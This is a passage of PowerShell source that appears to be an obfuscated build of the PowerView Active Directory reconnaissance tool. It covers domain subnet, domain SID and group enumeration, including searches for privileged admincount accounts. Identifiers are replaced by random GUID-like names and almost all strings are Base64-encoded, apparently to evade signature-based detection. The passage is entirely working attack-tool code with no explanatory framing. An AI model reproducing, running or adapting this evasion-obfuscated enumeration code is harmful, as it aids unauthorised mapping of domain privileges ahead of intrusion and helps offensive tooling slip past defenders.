                        ${d55af0d49294433fa1a30e317fe3d6fb} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        if (-not ${d55af0d49294433fa1a30e317fe3d6fb}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewA3AGUAZQBmADAANQAxADcAYQBmAGUAOQA0ADUAOQA3AGEAZgA4AGEAYgA0AGIAZQAzADkAYQA3ADIANAA1ADEAfQAnAA==')))
                        }
                    }
                }
                else {
                    try {
                        ${a58a88389bba4f499974f2986992284e} = (-Join (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                    }
                    catch {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkA')))
                    }
                }
            }
            if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${d55af0d49294433fa1a30e317fe3d6fb}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $(${d55af0d49294433fa1a30e317fe3d6fb}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${d55af0d49294433fa1a30e317fe3d6fb}.FindOne() }
            else { ${c1d2f3b775df48dfbe092797965c6f30} = ${d55af0d49294433fa1a30e317fe3d6fb}.FindAll() }
            ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${f9d3eb37e2d146b8bd464566418add70} = $_
                }
                else {
                    ${f9d3eb37e2d146b8bd464566418add70} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                }
                ${f9d3eb37e2d146b8bd464566418add70}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAHUAYgBuAGUAdAA='))))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                    if (${f9d3eb37e2d146b8bd464566418add70}.properties -and (${f9d3eb37e2d146b8bd464566418add70}.properties.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA=='))))) {
                        ${f9d3eb37e2d146b8bd464566418add70}
                    }
                    elseif (${f9d3eb37e2d146b8bd464566418add70}.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA==')))) {
                        ${f9d3eb37e2d146b8bd464566418add70}
                    }
                }
                else {
                    ${f9d3eb37e2d146b8bd464566418add70}
                }
            }
            if (${c1d2f3b775df48dfbe092797965c6f30}) {
                try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${d55af0d49294433fa1a30e317fe3d6fb}.dispose()
        }
    }
}
function c2fe926a73eb4d16beae5e1f576b1afb {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${afd7d337a750465cb1eadfa1f8ae176d} = @{
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${821e767198b248d3bef02b7a0e570885} = cec1def5409041f78ed8ecd436f7fa52 @afd7d337a750465cb1eadfa1f8ae176d -FindOne | Select-Object -First 1 -ExpandProperty objectsid
    if (${821e767198b248d3bef02b7a0e570885}) {
        ${821e767198b248d3bef02b7a0e570885}.SubString(0, ${821e767198b248d3bef02b7a0e570885}.LastIndexOf('-'))
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMASQBEAF0AIABFAHIAcgBvAHIAIABlAHgAdAByAGEAYwB0AGkAbgBnACAAZABvAG0AYQBpAG4AIABTAEkARAAgAGYAbwByACAAJwAkAEQAbwBtAGEAaQBuACcA')))
    }
}
function d174ca9e2db1482aa71d60f71b8d2690 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        ${e2fd4901292b4e7b9d4aa82603ed80a7},
        [Switch]
        ${b96d612809e84a5e9c95d9e5e1bd7504},
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        ${a31d9d67d38f43eeb2446c52d8a187b1},
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        ${a56e3670626b421eb4c33e98a1173d93},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${6dfca86fd3264c2999a087404e239e9e} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
    }
    PROCESS {
        if (${6dfca86fd3264c2999a087404e239e9e}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                if (${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${f1a750d612c847b28c1661f5f4353256} = ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${e2fd4901292b4e7b9d4aa82603ed80a7}
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
                    ${82f69dcdc6214875aac3c7ddffef0941} = $_.GetDirectoryEntry()
                    ${82f69dcdc6214875aac3c7ddffef0941}.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    ${82f69dcdc6214875aac3c7ddffef0941}.TokenGroups | ForEach-Object {
                        ${2d7c476caf164b22affc257b54255fe1} = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if (${2d7c476caf164b22affc257b54255fe1} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${2d7c476caf164b22affc257b54255fe1}
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $False
                            if (${f1a750d612c847b28c1661f5f4353256}) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${f1a750d612c847b28c1661f5f4353256} }
                            ${d9df5fc678774e82bffed7271d02d4ca} = dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d
                            if (${d9df5fc678774e82bffed7271d02d4ca}) {
                                ${d9df5fc678774e82bffed7271d02d4ca}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                                ${d9df5fc678774e82bffed7271d02d4ca}
                            }
                        }
                    }
                }
            }
            else {
                ${fb29aaa2f9c140909efae41cb42f1bef} = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    ${56aaa31f880a49e195bcf739ac331528} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewA1ADYAYQBhAGEAMwAxAGYAOAA4ADAAYQA0ADkAZQAxADkANQBiAGMAZgA3ADMAOQBhAGMAMwAzADEANQAyADgAfQApAA==')))
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${7eef0517afe94597af8ab4be39a72451} = ${56aaa31f880a49e195bcf739ac331528}.SubString(${56aaa31f880a49e195bcf739ac331528}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADcAZQBlAGYAMAA1ADEANwBhAGYAZQA5ADQANQA5ADcAYQBmADgAYQBiADQAYgBlADMAOQBhADcAMgA0ADUAMQB9ACcAIABmAHIAbwBtACAAJwAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AJwA=')))
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${7eef0517afe94597af8ab4be39a72451}
                            ${6dfca86fd3264c2999a087404e239e9e} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                            if (-not ${6dfca86fd3264c2999a087404e239e9e}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsANwBlAGUAZgAwADUAMQA3AGEAZgBlADkANAA1ADkANwBhAGYAOABhAGIANABiAGUAMwA5AGEANwAyADQANQAxAH0AJwA=')))
                            }
                        }
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${a58a88389bba4f499974f2986992284e} = (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528}.Contains('\')) {
                        ${742ef5907a3c4a6fa08a69570e3b96f2} = ${56aaa31f880a49e195bcf739ac331528}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | a4ad8c5db2444528bab99963038ffd7c -d6f8ca3d1c994c23b84c147c1aa4c2c9 Canonical
                        if (${742ef5907a3c4a6fa08a69570e3b96f2}) {
                            ${4f012487c687470fbf918145202d0777} = ${742ef5907a3c4a6fa08a69570e3b96f2}.SubString(0, ${742ef5907a3c4a6fa08a69570e3b96f2}.IndexOf('/'))
                            ${14eb3c56654d4851b0c0e59e10d33e62} = ${56aaa31f880a49e195bcf739ac331528}.Split('\')[1]
                            ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMQA0AGUAYgAzAGMANQA2ADYANQA0AGQANAA4ADUAMQBiADAAYwAwAGUANQA5AGUAMQAwAGQAMwAzAGUANgAyAH0AKQA=')))
                            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${4f012487c687470fbf918145202d0777}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADQAZgAwADEAMgA0ADgANwBjADYAOAA3ADQANwAwAGYAYgBmADkAMQA4ADEANAA1ADIAMAAyAGQAMAA3ADcANwB9ACcAIABmAHIAbwBtACAAJwAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AJwA=')))
                            ${6dfca86fd3264c2999a087404e239e9e} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
                        }
                    }
                    else {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkAKQA=')))
                    }
                }
                if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGEAZABtAGkAbgBDAG8AdQBuAHQAPQAxAA==')))
                    $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]) {
                    ${55b2ac7e7b19467e8fa6e5538a9c1a28} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]
                    $Filter = Switch (${55b2ac7e7b19467e8fa6e5538a9c1a28}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA0ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwA')))            { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARwBsAG8AYgBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGkAdgBlAHIAcwBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAVQBuAGkAdgBlAHIAcwBhAGwA')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA4ACkAKQA='))) }
                    }
